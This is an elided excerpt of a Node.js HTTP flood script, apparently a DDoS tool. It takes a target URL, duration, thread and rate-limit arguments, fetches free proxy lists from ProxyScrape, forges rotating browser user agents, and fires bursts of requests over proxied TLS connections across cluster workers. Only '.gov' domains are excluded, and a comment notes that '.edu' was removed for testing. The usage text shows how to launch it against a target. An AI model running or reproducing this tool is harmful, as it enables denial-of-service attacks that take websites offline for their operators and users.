...
const blockedDomain = [".gov"]; // Xóa .edu để thử nghiệm
...
const proxyArg = proxyIndex !== -1 && proxyIndex + 1 < process.argv.length ? process.argv[proxyIndex + 1] : undefined;
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyArg) {
    console.clear();
    console.error(`
    ...
    How to use & example:
      ...
      node ${process.argv[1]} GET "https://target.com" 120 16 90 true --debug
    ...
    Options:
      ...
      --proxy file.txt or true - use proxy file or download from https://proxyscrape.com/free-proxy-list
    `);
    process.exit(1);
}
...
function loadProxies(callback) {
    if (proxyArg === 'true') {
        ...
        const proxyUrl = 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&proxytype=http&timeout=15000';
        https.get(proxyUrl, (res) => {
            ...
            res.on('end', () => {
                ...
                if (proxy.length === 0) {
                    console.error('Failed to download proxy list from ProxyScrape or no valid proxies found.');
                    process.exit(1);
                }
                console.log(`Downloaded ${proxy.length} proxies from ProxyScrape.`);
                callback();
            });
        }).on('error', (e) => {
            console.error('Error downloading proxy list:', e.message);
            process.exit(1);
        });
    } else {
        // Read proxy list from file
        try {
            proxy = fs.readFileSync(proxyArg, 'utf8').replace(/\r/g, '').split('\n').filter(line => line.trim() !== '');
            console.log(`Loaded ${proxy.length} proxies from ${proxyArg}.`);
            callback();
        } catch (e) {
            console.error(`Error reading proxy file ${proxyArg}:`, e.message);
            process.exit(1);
        }
    }
}
...
function buildRequest() {
    const browserVersion = getRandomInt(120, 126);

    const fwfw = ['Google Chrome', 'Brave', 'Microsoft Edge', 'Firefox'];
    ...
    const userAgent = customUA || `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ${wfwf}/${browserVersion}.0.0.0 Safari/537.36`;
...
function go() {
    let tlsSocket = null; // Initialize tlsSocket as null
        ...
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                ...
                function doWrite() {
                    ...
                    for (let i = 0; i < (isFull ? currentRatelimit * 2 : currentRatelimit); i++) {
                        const browserVersion = getRandomInt(120, 126);
...
// Run the script only after proxies are loaded
loadProxies(() => {
    if (cluster.isMaster) {
        const workers = {};
        ...
        if (debugMode) {
            setInterval(() => {
                ...
                console.clear();
                console.log(new Date().toLocaleString('us', { timeZone: 'Asia/Ho_Chi_Minh' }), `|${target}|`, statuses);
            }, 1000);
        }
